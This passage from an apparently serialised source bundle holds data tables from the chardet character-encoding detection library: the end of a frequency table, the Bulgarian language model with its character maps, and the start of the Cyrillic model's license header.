919,2352,2975,2353,1270,4727,4115,  73,5556,5557, 647,5558,3259,2856,2259,1550, # 4240\n1346,3024,5559,1332, 883,3526,5560,5561,5562,5563,3334,2775,5564,1212, 831,1347, # 4256\n4370,4728,2331,3909,1864,3073, 720,3910,4729,4730,3911,5565,4371,5566,5567,4731, # 4272\n5568,5569,1799,4732,3774,2619,4733,3641,1645,2376,4734,5570,2938, 669,2211,2675, # 4288\n2434,5571,2893,5572,5573,1028,3260,5574,4372,2413,5575,2260,1353,5576,5577,4735, # 4304\n3183, 518,5578,4116,5579,4373,1961,5580,2143,4374,5581,5582,3025,2354,2355,3912, # 4320\n 516,1834,1454,4117,2708,4375,4736,2229,2620,1972,1129,3642,5583,2776,5584,2976, # 4336\n1422, 577,1470,3026,1524,3410,5585,5586, 432,4376,3074,3527,5587,2594,1455,2515, # 4352\n2230,1973,1175,5588,1020,2741,4118,3528,4737,5589,2742,5590,1743,1361,3075,3529, # 4368\n2649,4119,4377,4738,2295, 895, 924,4378,2171, 331,2247,3076, 166,1627,3077,1098, # 4384\n5591,1232,2894,2231,3411,4739, 657, 403,1196,2377, 542,3775,3412,1600,4379,3530, # 4400\n5592,4740,2777,3261, 576, 530,1362,4741,4742,2540,2676,3776,4120,5593, 842,3913, # 4416\n5594,2814,2032,1014,4121, 213,2709,3413, 665, 621,4380,5595,3777,2939,2435,5596, # 4432\n2436,3335,3643,3414,4743,4381,2541,4382,4744,3644,1682,4383,3531,1380,5597, 724, # 4448\n2282, 600,1670,5598,1337,1233,4745,3126,2248,5599,1621,4746,5600, 651,4384,5601, # 4464\n1612,4385,2621,5602,2857,5603,2743,2312,3078,5604, 716,2464,3079, 174,1255,2710, # 4480\n4122,3645, 548,1320,1398, 728,4123,1574,5605,1891,1197,3080,4124,5606,3081,3082, # 4496\n3778,3646,3779, 747,5607, 635,4386,4747,5608,5609,5610,4387,5611,5612,4748,5613, # 4512\n3415,4749,2437, 451,5614,3780,2542,2073,4388,2744,4389,4125,5615,1764,4750,5616, # 4528\n4390, 350,4751,2283,2395,2493,5617,4391,4126,2249,1434,4127, 488,4752, 458,4392, # 4544\n4128,3781, 771,1330,2396,3914,2576,3184,2160,2414,1553,2677,3185,4393,5618,2494, # 4560\n2895,2622,1720,2711,4394,3416,4753,5619,2543,4395,5620,3262,4396,2778,5621,2016, # 4576\n2745,5622,1155,1017,3782,3915,5623,3336,2313, 201,1865,4397,1430,5624,4129,5625, # 4592\n5626,5627,5628,5629,4398,1604,5630, 414,1866, 371,2595,4754,4755,3532,2017,3127, # 4608\n4756,1708, 960,4399, 887, 389,2172,1536,1663,1721,5631,2232,4130,2356,2940,1580, # 4624\n5632,5633,1744,4757,2544,4758,4759,5634,4760,5635,2074,5636,4761,3647,3417,2896, # 4640\n4400,5637,4401,2650,3418,2815, 673,2712,2465, 709,3533,4131,3648,4402,5638,1148, # 4656\n 502, 634,5639,5640,1204,4762,3649,1575,4763,2623,3783,5641,3784,3128, 948,3263, # 4672\n 121,1745,3916,1110,5642,4403,3083,2516,3027,4132,3785,1151,1771,3917,1488,4133, # 4688\n1987,5643,2438,3534,5644,5645,2094,5646,4404,3918,1213,1407,2816, 531,2746,2545, # 4704\n3264,1011,1537,4764,2779,4405,3129,1061,5647,3786,3787,1867,2897,5648,2018, 120, # 4720\n4406,4407,2063,3650,3265,2314,3919,2678,3419,1955,4765,4134,5649,3535,1047,2713, # 4736\n1266,5650,1368,4766,2858, 649,3420,3920,2546,2747,1102,2859,2679,5651,5652,2000, # 4752\n5653,1111,3651,2977,5654,2495,3921,3652,2817,1855,3421,3788,5655,5656,3422,2415, # 4768\n2898,3337,3266,3653,5657,2577,5658,3654,2818,4135,1460, 856,5659,3655,5660,2899, # 4784\n2978,5661,2900,3922,5662,4408, 632,2517, 875,3923,1697,3924,2296,5663,5664,4767, # 4800\n3028,1239, 580,4768,4409,5665, 914, 936,2075,1190,4136,1039,2124,5666,5667,5668, # 4816\n5669,3423,1473,5670,1354,4410,3925,4769,2173,3084,4137, 915,3338,4411,4412,3339, # 4832\n1605,1835,5671,2748, 398,3656,4413,3926,4138, 328,1913,2860,4139,3927,1331,4414, # 4848\n3029, 937,4415,5672,3657,4140,4141,3424,2161,4770,3425, 524, 742, 538,3085,1012, # 4864\n5673,5674,3928,2466,5675, 658,1103, 225,3929,5676,5677,4771,5678,4772,5679,3267, # 4880\n1243,5680,4142, 963,2250,4773,5681,2714,3658,3186,5682,5683,2596,2332,5684,4774, # 4896\n5685,5686,5687,3536, 957,3426,2547,2033,1931,2941,2467, 870,2019,3659,1746,2780, # 4912\n2781,2439,2468,5688,3930,5689,3789,3130,3790,3537,3427,3791,5690,1179,3086,5691, # 4928\n3187,2378,4416,3792,2548,3188,3131,2749,4143,5692,3428,1556,2549,2297, 977,2901, # 4944\n2034,4144,1205,3429,5693,1765,3430,3189,2125,1271, 714,1689,4775,3538,5694,2333, # 4960\n3931, 533,4417,3660,2184, 617,5695,2469,3340,3539,2315,5696,5697,3190,5698,5699, # 4976\n3932,1988, 618, 427,2651,3540,3431,5700,5701,1244,1690,5702,2819,4418,4776,5703, # 4992\n3541,4777,5704,2284,1576, 473,3661,4419,3432, 972,5705,3662,5706,3087,5707,5708, # 5008\n4778,4779,5709,3793,4145,4146,5710, 153,4780, 356,5711,1892,2902,4420,2144, 408, # 5024\n 803,2357,5712,3933,5713,4421,1646,2578,2518,4781,4782,3934,5714,3935,4422,5715, # 5040\n2416,3433, 752,5716,5717,1962,3341,2979,5718, 746,3030,2470,4783,4423,3794, 698, # 5056\n4784,1893,4424,3663,2550,4785,3664,3936,5719,3191,3434,5720,1824,1302,4147,2715, # 5072\n3937,1974,4425,5721,4426,3192, 823,1303,1288,1236,2861,3542,4148,3435, 774,3938, # 5088\n5722,1581,4786,1304,2862,3939,4787,5723,2440,2162,1083,3268,4427,4149,4428, 344, # 5104\n1173, 288,2316, 454,1683,5724,5725,1461,4788,4150,2597,5726,5727,4789, 985, 894, # 5120\n5728,3436,3193,5729,1914,2942,3795,1989,5730,2111,1975,5731,4151,5732,2579,1194, # 5136\n 425,5733,4790,3194,1245,3796,4429,5734,5735,2863,5736, 636,4791,1856,3940, 760, # 5152\n1800,5737,4430,2212,1508,4792,4152,1894,1684,2298,5738,5739,4793,4431,4432,2213, # 5168\n 479,5740,5741, 832,5742,4153,2496,5743,2980,2497,3797, 990,3132, 627,1815,2652, # 5184\n4433,1582,4434,2126,2112,3543,4794,5744, 799,4435,3195,5745,4795,2113,1737,3031, # 5200\n1018, 543, 754,4436,3342,1676,4796,4797,4154,4798,1489,5746,3544,5747,2624,2903, # 5216\n4155,5748,5749,2981,5750,5751,5752,5753,3196,4799,4800,2185,1722,5754,3269,3270, # 5232\n1843,3665,1715, 481, 365,1976,1857,5755,5756,1963,2498,4801,5757,2127,3666,3271, # 5248\n 433,1895,2064,2076,5758, 602,2750,5759,5760,5761,5762,5763,3032,1628,3437,5764, # 5264\n3197,4802,4156,2904,4803,2519,5765,2551,2782,5766,5767,5768,3343,4804,2905,5769, # 5280\n4805,5770,2864,4806,4807,1221,2982,4157,2520,5771,5772,5773,1868,1990,5774,5775, # 5296\n5776,1896,5777,5778,4808,1897,4158, 318,5779,2095,4159,4437,5780,5781, 485,5782, # 5312\n 938,3941, 553,2680, 116,5783,3942,3667,5784,3545,2681,2783,3438,3344,2820,5785, # 5328\n3668,2943,4160,1747,2944,2983,5786,5787, 207,5788,4809,5789,4810,2521,5790,3033, # 5344\n 890,3669,3943,5791,1878,3798,3439,5792,2186,2358,3440,1652,5793,5794,5795, 941, # 5360\n2299, 208,3546,4161,2020, 330,4438,3944,2906,2499,3799,4439,4811,5796,5797,5798, # 5376\n)\n\n", "thirdparty/chardet/langbulgarianmodel.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# 255: Control characters that usually does not exist in any text\n# 254: Carriage/Return\n# 253: symbol (punctuation) that does not belong to word\n# 252: 0 - 9\n\n# Character Mapping Table:\n# this table is modified base on win1251BulgarianCharToOrderMap, so\n# only number <64 is sure valid\n\nLatin5_BulgarianCharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 77, 90, 99,100, 72,109,107,101, 79,185, 81,102, 76, 94, 82,  # 40\n110,186,108, 91, 74,119, 84, 96,111,187,115,253,253,253,253,253,  # 50\n253, 65, 69, 70, 66, 63, 68,112,103, 92,194,104, 95, 86, 87, 71,  # 60\n116,195, 85, 93, 97,113,196,197,198,199,200,253,253,253,253,253,  # 70\n194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,  # 80\n210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,  # 90\n 81,226,227,228,229,230,105,231,232,233,234,235,236, 45,237,238,  # a0\n 31, 32, 35, 43, 37, 44, 55, 47, 40, 59, 33, 46, 38, 36, 41, 30,  # b0\n 39, 28, 34, 51, 48, 49, 53, 50, 54, 57, 61,239, 67,240, 60, 56,  # c0\n  1, 18,  9, 20, 11,  3, 23, 15,  2, 26, 12, 10, 14,  6,  4, 13,  # d0\n  7,  8,  5, 19, 29, 25, 22, 21, 27, 24, 17, 75, 52,241, 42, 16,  # e0\n 62,242,243,244, 58,245, 98,246,247,248,249,250,251, 91,252,253,  # f0\n)\n\nwin1251BulgarianCharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 77, 90, 99,100, 72,109,107,101, 79,185, 81,102, 76, 94, 82,  # 40\n110,186,108, 91, 74,119, 84, 96,111,187,115,253,253,253,253,253,  # 50\n253, 65, 69, 70, 66, 63, 68,112,103, 92,194,104, 95, 86, 87, 71,  # 60\n116,195, 85, 93, 97,113,196,197,198,199,200,253,253,253,253,253,  # 70\n206,207,208,209,210,211,212,213,120,214,215,216,217,218,219,220,  # 80\n221, 78, 64, 83,121, 98,117,105,222,223,224,225,226,227,228,229,  # 90\n 88,230,231,232,233,122, 89,106,234,235,236,237,238, 45,239,240,  # a0\n 73, 80,118,114,241,242,243,244,245, 62, 58,246,247,248,249,250,  # b0\n 31, 32, 35, 43, 37, 44, 55, 47, 40, 59, 33, 46, 38, 36, 41, 30,  # c0\n 39, 28, 34, 51, 48, 49, 53, 50, 54, 57, 61,251, 67,252, 60, 56,  # d0\n  1, 18,  9, 20, 11,  3, 23, 15,  2, 26, 12, 10, 14,  6,  4, 13,  # e0\n  7,  8,  5, 19, 29, 25, 22, 21, 27, 24, 17, 75, 52,253, 42, 16,  # f0\n)\n\n# Model Table:\n# total sequences: 100%\n# first 512 sequences: 96.9392%\n# first 1024 sequences:3.0618%\n# rest  sequences:     0.2992%\n# negative sequences:  0.0020%\nBulgarianLangModel = (\n0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,2,3,3,3,3,3,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,0,3,3,3,2,2,3,2,2,1,2,2,\n3,1,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,0,3,3,3,3,3,3,3,3,3,3,0,3,0,1,\n0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,2,3,3,3,3,3,3,3,3,0,3,1,0,\n0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n3,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,1,3,2,3,3,3,3,3,3,3,3,0,3,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,2,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,1,3,2,3,3,3,3,3,3,3,3,0,3,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,3,2,3,2,2,1,3,3,3,3,2,2,2,1,1,2,0,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,2,3,2,2,3,3,1,1,2,3,3,2,3,3,3,3,2,1,2,0,2,0,3,0,0,\n0,0,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,1,3,3,3,3,3,2,3,2,3,3,3,3,3,2,3,3,1,3,0,3,0,2,0,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,3,1,3,3,2,3,3,3,1,3,3,2,3,2,2,2,0,0,2,0,2,0,2,0,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,3,3,0,3,3,3,2,2,3,3,3,1,2,2,3,2,1,1,2,0,2,0,0,0,0,\n1,0,0,0,0,0,0,0,0,0,2,0,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,2,3,3,1,2,3,2,2,2,3,3,3,3,3,2,2,3,1,2,0,2,1,2,0,0,\n0,0,0,0,0,0,0,0,0,0,3,0,0,1,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,1,3,3,3,3,3,2,3,3,3,2,3,3,2,3,2,2,2,3,1,2,0,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,3,3,3,3,1,1,1,2,2,1,3,1,3,2,2,3,0,0,1,0,1,0,1,0,0,\n0,0,0,1,0,0,0,0,1,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,2,2,3,2,2,3,1,2,1,1,1,2,3,1,3,1,2,2,0,1,1,1,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,1,3,2,2,3,3,1,2,3,1,1,3,3,3,3,1,2,2,1,1,1,0,2,0,2,0,1,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,2,2,3,3,3,2,2,1,1,2,0,2,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,0,1,2,1,3,3,2,3,3,3,3,3,2,3,2,1,0,3,1,2,1,2,1,2,3,2,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,1,1,2,3,3,3,3,3,3,3,3,3,3,3,3,0,0,3,1,3,3,2,3,3,2,2,2,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,3,3,3,3,0,3,3,3,3,3,2,1,1,2,1,3,3,0,3,1,1,1,1,3,2,0,1,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,2,2,2,3,3,3,3,3,3,3,3,3,3,3,1,1,3,1,3,3,2,3,2,2,2,3,0,2,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,2,3,3,2,2,3,2,1,1,1,1,1,3,1,3,1,1,0,0,0,1,0,0,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,2,3,2,0,3,2,0,3,0,2,0,0,2,1,3,1,0,0,1,0,0,0,1,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,2,1,1,1,1,2,1,1,2,1,1,1,2,2,1,2,1,1,1,0,1,1,0,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,2,1,3,1,1,2,1,3,2,1,1,0,1,2,3,2,1,1,1,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,3,3,3,3,2,2,1,0,1,0,0,1,0,0,0,2,1,0,3,0,0,1,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,2,3,2,3,3,1,3,2,1,1,1,2,1,1,2,1,3,0,1,0,0,0,1,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,1,1,2,2,3,3,2,3,2,2,2,3,1,2,2,1,1,2,1,1,2,2,0,1,1,0,1,0,2,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,2,1,3,1,0,2,2,1,3,2,1,0,0,2,0,2,0,1,0,0,0,0,0,0,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,1,2,0,2,3,1,2,3,2,0,1,3,1,2,1,1,1,0,0,1,0,0,2,2,2,3,\n2,2,2,2,1,2,1,1,2,2,1,1,2,0,1,1,1,0,0,1,1,0,0,1,1,0,0,0,1,1,0,1,\n3,3,3,3,3,2,1,2,2,1,2,0,2,0,1,0,1,2,1,2,1,1,0,0,0,1,0,1,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,\n3,3,2,3,3,1,1,3,1,0,3,2,1,0,0,0,1,2,0,2,0,1,0,0,0,1,0,1,2,1,2,2,\n1,1,1,1,1,1,1,2,2,2,1,1,1,1,1,1,1,0,1,2,1,1,1,0,0,0,0,0,1,1,0,0,\n3,1,0,1,0,2,3,2,2,2,3,2,2,2,2,2,1,0,2,1,2,1,1,1,0,1,2,1,2,2,2,1,\n1,1,2,2,2,2,1,2,1,1,0,1,2,1,2,2,2,1,1,1,0,1,1,1,1,2,0,1,0,0,0,0,\n2,3,2,3,3,0,0,2,1,0,2,1,0,0,0,0,2,3,0,2,0,0,0,0,0,1,0,0,2,0,1,2,\n2,1,2,1,2,2,1,1,1,2,1,1,1,0,1,2,2,1,1,1,1,1,0,1,1,1,0,0,1,2,0,0,\n3,3,2,2,3,0,2,3,1,1,2,0,0,0,1,0,0,2,0,2,0,0,0,1,0,1,0,1,2,0,2,2,\n1,1,1,1,2,1,0,1,2,2,2,1,1,1,1,1,1,1,0,1,1,1,0,0,0,0,0,0,1,1,0,0,\n2,3,2,3,3,0,0,3,0,1,1,0,1,0,0,0,2,2,1,2,0,0,0,0,0,0,0,0,2,0,1,2,\n2,2,1,1,1,1,1,2,2,2,1,0,2,0,1,0,1,0,0,1,0,1,0,0,1,0,0,0,0,1,0,0,\n3,3,3,3,2,2,2,2,2,0,2,1,1,1,1,2,1,2,1,1,0,2,0,1,0,1,0,0,2,0,1,2,\n1,1,1,1,1,1,1,2,2,1,1,0,2,0,1,0,2,0,0,1,1,1,0,0,2,0,0,0,1,1,0,0,\n2,3,3,3,3,1,0,0,0,0,0,0,0,0,0,0,2,0,0,1,1,0,0,0,0,0,0,1,2,0,1,2,\n2,2,2,1,1,2,1,1,2,2,2,1,2,0,1,1,1,1,1,1,0,1,1,1,1,0,0,1,1,1,0,0,\n2,3,3,3,3,0,2,2,0,2,1,0,0,0,1,1,1,2,0,2,0,0,0,3,0,0,0,0,2,0,2,2,\n1,1,1,2,1,2,1,1,2,2,2,1,2,0,1,1,1,0,1,1,1,1,0,2,1,0,0,0,1,1,0,0,\n2,3,3,3,3,0,2,1,0,0,2,0,0,0,0,0,1,2,0,2,0,0,0,0,0,0,0,0,2,0,1,2,\n1,1,1,2,1,1,1,1,2,2,2,0,1,0,1,1,1,0,0,1,1,1,0,0,1,0,0,0,0,1,0,0,\n3,3,2,2,3,0,1,0,1,0,0,0,0,0,0,0,1,1,0,3,0,0,0,0,0,0,0,0,1,0,2,2,\n1,1,1,1,1,2,1,1,2,2,1,2,2,1,0,1,1,1,1,1,0,1,0,0,1,0,0,0,1,1,0,0,\n3,1,0,1,0,2,2,2,2,3,2,1,1,1,2,3,0,0,1,0,2,1,1,0,1,1,1,1,2,1,1,1,\n1,2,2,1,2,1,2,2,1,1,0,1,2,1,2,2,1,1,1,0,0,1,1,1,2,1,0,1,0,0,0,0,\n2,1,0,1,0,3,1,2,2,2,2,1,2,2,1,1,1,0,2,1,2,2,1,1,2,1,1,0,2,1,1,1,\n1,2,2,2,2,2,2,2,1,2,0,1,1,0,2,1,1,1,1,1,0,0,1,1,1,1,0,1,0,0,0,0,\n2,1,1,1,1,2,2,2,2,1,2,2,2,1,2,2,1,1,2,1,2,3,2,2,1,1,1,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,3,2,0,1,2,0,1,2,1,1,0,1,0,1,2,1,2,0,0,0,1,1,0,0,0,1,0,0,2,\n1,1,0,0,1,1,0,1,1,1,1,0,2,0,1,1,1,0,0,1,1,0,0,0,0,1,0,0,0,1,0,0,\n2,0,0,0,0,1,2,2,2,2,2,2,2,1,2,1,1,1,1,1,1,1,0,1,1,1,1,1,2,1,1,1,\n1,2,2,2,2,1,1,2,1,2,1,1,1,0,2,1,2,1,1,1,0,2,1,1,1,1,0,1,0,0,0,0,\n3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,\n1,1,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,3,2,0,0,0,0,1,0,0,0,0,0,0,1,1,0,2,0,0,0,0,0,0,0,0,1,0,1,2,\n1,1,1,1,1,1,0,0,2,2,2,2,2,0,1,1,0,1,1,1,1,1,0,0,1,0,0,0,1,1,0,1,\n2,3,1,2,1,0,1,1,0,2,2,2,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,0,1,0,1,2,\n1,1,1,1,2,1,1,1,1,1,1,1,1,0,1,1,0,1,0,1,0,1,0,0,1,0,0,0,0,1,0,0,\n2,2,2,2,2,0,0,2,0,0,2,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,2,0,2,2,\n1,1,1,1,1,0,0,1,2,1,1,0,1,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,\n1,2,2,2,2,0,0,2,0,1,1,0,0,0,1,0,0,2,0,2,0,0,0,0,0,0,0,0,0,0,1,1,\n0,0,0,1,1,1,1,1,1,1,1,1,1,0,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,\n1,2,2,3,2,0,0,1,0,0,1,0,0,0,0,0,0,1,0,2,0,0,0,1,0,0,0,0,0,0,0,2,\n1,1,0,0,1,0,0,0,1,1,0,0,1,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,\n2,1,2,2,2,1,2,1,2,2,1,1,2,1,1,1,0,1,1,1,1,2,0,1,0,1,1,1,1,0,1,1,\n1,1,2,1,1,1,1,1,1,0,0,1,2,1,1,1,1,1,1,0,0,1,1,1,0,0,0,0,0,0,0,0,\n1,0,0,1,3,1,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,2,1,0,0,1,0,2,0,0,0,0,0,1,1,1,0,1,0,0,0,0,0,0,0,0,2,0,0,1,\n0,2,0,1,0,0,1,1,2,0,1,0,1,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,\n1,2,2,2,2,0,1,1,0,2,1,0,1,1,1,0,0,1,0,2,0,1,0,0,0,0,0,0,0,0,0,1,\n0,1,0,0,1,0,0,0,1,1,0,0,1,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,2,2,0,0,1,0,0,0,1,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,1,\n0,1,0,1,1,1,0,0,1,1,1,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,\n2,0,1,0,0,1,2,1,1,1,1,1,1,2,2,1,0,0,1,0,1,0,0,0,0,1,1,1,1,0,0,0,\n1,1,2,1,1,1,1,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,2,1,2,1,0,0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,1,\n0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,0,0,1,2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,\n0,1,1,0,1,1,1,0,0,1,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,\n1,0,1,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,1,0,2,0,0,2,0,1,0,0,1,0,0,1,\n1,1,0,0,1,1,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,\n1,1,1,1,1,1,1,2,0,0,0,0,0,0,2,1,0,1,1,0,0,1,1,1,0,1,0,0,0,0,0,0,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,1,0,1,1,1,1,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n)\n\nLatin5BulgarianModel = {\n  'char_to_order_map': Latin5_BulgarianCharToOrderMap,\n  'precedence_matrix': BulgarianLangModel,\n  'typical_positive_ratio': 0.969392,\n  'keep_english_letter': False,\n  'charset_name': \"ISO-8859-5\",\n  'language': 'Bulgairan',\n}\n\nWin1251BulgarianModel = {\n  'char_to_order_map': win1251BulgarianCharToOrderMap,\n  'precedence_matrix': BulgarianLangModel,\n  'typical_positive_ratio': 0.969392,\n  'keep_english_letter': False,\n  'charset_name': \"windows-1251\",\n  'language': 'Bulgarian',\n}\n", "thirdparty/chardet/langcyrillicmodel.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# 